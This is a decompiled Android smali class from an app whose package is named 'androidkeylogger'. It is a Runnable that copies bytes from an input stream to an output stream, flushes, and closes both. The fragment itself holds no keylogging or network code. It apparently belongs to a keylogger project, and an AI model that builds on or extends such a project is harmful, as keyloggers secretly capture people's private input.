.class Lcom/bshu2/androidkeylogger/MainActivity$100000001;
.super Ljava/lang/Object;
.source "MainActivity.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/bshu2/androidkeylogger/MainActivity;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x20
    name = "100000001"
.end annotation


# instance fields
.field private final val$input:Ljava/io/InputStream;

.field private final val$output:Ljava/io/OutputStream;


# direct methods
.method constructor <init>(Ljava/io/InputStream;Ljava/io/OutputStream;)V
    .locals 6

    move-object v0, p0

    move-object v1, p1

    move-object v2, p2

    move-object v4, v0

    invoke-direct {v4}, Ljava/lang/Object;-><init>()V

    move-object v4, v0

    move-object v5, v1

    iput-object v5, v4, Lcom/bshu2/androidkeylogger/MainActivity$100000001;->val$input:Ljava/io/InputStream;

    move-object v4, v0

    move-object v5, v2

    iput-object v5, v4, Lcom/bshu2/androidkeylogger/MainActivity$100000001;->val$output:Ljava/io/OutputStream;

    return-void
.end method


# virtual methods
.method public run()V
    .locals 15
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 86
    move-object v0, p0

    const/16 v10, 0x1000

    :try_start_0
    new-array v10, v10, [B

    move-object v6, v10

    .line 88
    :cond_0
    :goto_0
    move-object v10, v0

    iget-object v10, v10, Lcom/bshu2/androidkeylogger/MainActivity$100000001;->val$input:Ljava/io/InputStream;

    move-object v11, v6

    invoke-virtual {v10, v11}, Ljava/io/InputStream;->read([B)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    move-result v10

    move v14, v10

    move v10, v14

    move v11, v14

    move v7, v11

    const/4 v11, -0x1

    if-ne v10, v11, :cond_1

    .line 100
    :goto_1
    move-object v10, v0

    :try_start_1
    iget-object v10, v10, Lcom/bshu2/androidkeylogger/MainActivity$100000001;->val$input:Ljava/io/InputStream;

    invoke-virtual {v10}, Ljava/io/InputStream;->close()V

    .line 101
    move-object v10, v0

    iget-object v10, v10, Lcom/bshu2/androidkeylogger/MainActivity$100000001;->val$output:Ljava/io/OutputStream;

    invoke-virtual {v10}, Ljava/io/OutputStream;->close()V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_2

    :goto_2
    return-void

    .line 89
    :cond_1
    move-object v10, v0

    :try_start_2
    iget-object v10, v10, Lcom/bshu2/androidkeylogger/MainActivity$100000001;->val$output:Ljava/io/OutputStream;

    if-eqz v10, :cond_0

    .line 90
    move-object v10, v0

    iget-object v10, v10, Lcom/bshu2/androidkeylogger/MainActivity$100000001;->val$output:Ljava/io/OutputStream;

    move-object v11, v6

    const/4 v12, 0x0

    move v13, v7

    invoke-virtual {v10, v11, v12, v13}, Ljava/io/OutputStream;->write([BII)V

    .line 91
    move-object v10, v0

    iget-object v10, v10, Lcom/bshu2/androidkeylogger/MainActivity$100000001;->val$input:Ljava/io/InputStream;

    invoke-virtual {v10}, Ljava/io/InputStream;->available()I

    move-result v10

    const/4 v11, 0x0

    if-ne v10, v11, :cond_0

    .line 92
    move-object v10, v0

    iget-object v10, v10, Lcom/bshu2/androidkeylogger/MainActivity$100000001;->val$output:Ljava/io/OutputStream;

    invoke-virtual {v10}, Ljava/io/OutputStream;->flush()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    goto :goto_0

    .line 88
    :catch_0
    move-exception v10

    move-object v6, v10

    goto :goto_1

    :catchall_0
    move-exception v10

    move-object v2, v10

    .line 100
    move-object v10, v0

    :try_start_3
    iget-object v10, v10, Lcom/bshu2/androidkeylogger/MainActivity$100000001;->val$input:Ljava/io/InputStream;

    invoke-virtual {v10}, Ljava/io/InputStream;->close()V

    .line 101
    move-object v10, v0

    iget-object v10, v10, Lcom/bshu2/androidkeylogger/MainActivity$100000001;->val$output:Ljava/io/OutputStream;

    invoke-virtual {v10}, Ljava/io/OutputStream;->close()V
    :try_end_3
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_1

    :goto_3
    move-object v10, v2

    throw v10

    :catch_1
    move-exception v10

    move-object v8, v10

    goto :goto_3

    :catch_2
    move-exception v10

    move-object v8, v10

    goto :goto_2
.end method
